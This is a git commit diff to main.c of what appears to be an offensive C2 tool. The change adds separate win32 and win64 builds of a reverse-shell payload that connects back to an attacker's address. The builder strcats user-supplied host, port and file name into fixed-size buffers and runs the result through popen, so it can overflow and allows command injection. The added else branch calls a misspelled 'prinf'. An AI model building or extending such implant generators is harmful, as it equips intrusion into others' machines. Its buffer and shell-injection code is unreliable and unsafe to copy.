1151218560ea71a54a456274d9857a6b9de9d4c8
Lionskey <LoganGoins@protonmail.com>
2022-12-15 11:18:23 -0600

    added seperate win32 and 64 payload gen

--- main.c
+++ main.c
@@ -56,7 +56,7 @@ int main(int argc, char **argv){
     printf("\nPayload Generation Options\n--------------------------------------------------------\n");
     printf("-p, --port <port>                                      port for the reverse shell to connect back on\n");
     printf("-o, --output <outputfile>                              file to output payload to\n");
-    printf("-w, --platform <platform>                              file payload platform specific (linux or windows)\n");
+    printf("-w, --platform <platform>                              file payload platform specific (linux, win32, or win64)\n");
     printf("-l, --localhost <address>                              address that the payload will connect back to (address of attacker C2 server)\n\n");
   }  
 
@@ -90,6 +90,7 @@ int main(int argc, char **argv){
       char port[30];
       char unix_cmd[100] = "gcc payload_linux.c -o ";
       char win64_cmd[150] = "x86_64-w64-mingw32-gcc payload_win.c -o ";
+      char win32_cmd[150] = "i686-w64-mingw32-gcc payload_win.c -o ";
       char winlib[30] = " -lws2_32";
 
       for(int i = 0; argv[i]; i++){
@@ -126,25 +127,44 @@ int main(int argc, char **argv){
          popen(unix_cmd, "r");
          printf("Generated payload successfully for platform: %s\n", platform);
       }
-      else if(strcmp(platform, "windows") == 0){
+      else if(strcmp(platform, "win64") == 0){
          // build command string
          // x86_64-w64-mingw32-gcc payload_win.c -o win32.exe -D LHOST=\"127.0.0.1\" -D PORT=4444 -lws2_32
-         strcat(unix_cmd, outfile);
-         strcat(unix_cmd, param);
-         strcat(unix_cmd, portvar);
-         strcat(unix_cmd, port);
-         strcat(unix_cmd, param);
-         strcat(unix_cmd, targetvar);
-         strcat(unix_cmd, ip_escape);
-         strcat(unix_cmd, lhost);
-         strcat(unix_cmd, ip_escape);
-         strcat(unix_cmd, winlib);
-         popen(unix_cmd, "r");
+         strcat(win64_cmd, outfile);
+         strcat(win64_cmd, param);
+         strcat(win64_cmd, portvar);
+         strcat(win64_cmd, port);
+         strcat(win64_cmd, param);
+         strcat(win64_cmd, targetvar);
+         strcat(win64_cmd, ip_escape);
+         strcat(win64_cmd, lhost);
+         strcat(win64_cmd, ip_escape);
+         strcat(win64_cmd, winlib);
+         popen(win64_cmd, "r");
          printf("Generated payload successfully for platform: %s\n", platform);
           
-        
       }
-      
+      else if(strcmp(platform, "win32") == 0){
+         // build command string
+         // i686-w64-mingw32-gcc payload_win.c -o payload.exe -D LHOST=\"127.0.0.1\" -D PORT=4444 -lws2_32
+         strcat(win32_cmd, outfile);
+         strcat(win32_cmd, param);
+         strcat(win32_cmd, portvar);
+         strcat(win32_cmd, port);
+         strcat(win32_cmd, param);
+         strcat(win32_cmd, targetvar);
+         strcat(win32_cmd, ip_escape);
+         strcat(win32_cmd, lhost);
+         strcat(win32_cmd, ip_escape);
+         strcat(win32_cmd, winlib);
+         popen(win32_cmd, "r");
+         printf("Generated payload successfully for platform: %s\n", platform);
+          
+
+      }
+      else{
+         prinf("Please enter a valid platform\n");
+      }
     }
   }
 
